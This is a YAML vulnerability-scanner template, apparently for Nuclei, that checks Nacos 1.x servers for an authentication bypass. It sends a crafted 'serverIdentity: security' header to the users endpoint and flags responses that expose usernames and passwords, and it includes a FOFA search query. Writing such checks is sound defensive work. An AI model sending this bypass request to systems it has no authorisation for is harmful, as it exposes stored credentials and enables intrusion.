id: nacos-auth-bypass

info:
  name: Nacos 1.x - 认证绕过漏洞
  author: taielab,pikpikcu,SleepingBag945
  severity: critical
  description: Nacos 1.x - 认证绕过 存在认证绕过漏洞。该模板依据实际请求路径、返回特征与命中证据验证目标是否暴露相应漏洞。
  reference:
    - https://github.com/alibaba/nacos/issues/4593
    - https://nacos.io/en-us/docs/auth.html
    - https://zhuanlan.zhihu.com/p/602021283
  classification:
    cpe: cpe:2.3:a:alibaba:nacos:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: alibaba
    product: nacos
    fofa-query: app="NACOS"
  tags: nacos,auth-bypass,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=9"
      - "{{BaseURL}}/v1/auth/users?pageNo=1&pageSize=9"

    headers:
      serverIdentity: security
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"totalCount":'
          - '"username":'
          - '"password":'
          - '"pagesAvailable":'
        condition: and

      - type: word
        part: header
        words:
          - application/json

      - type: status
        status:
          - 200
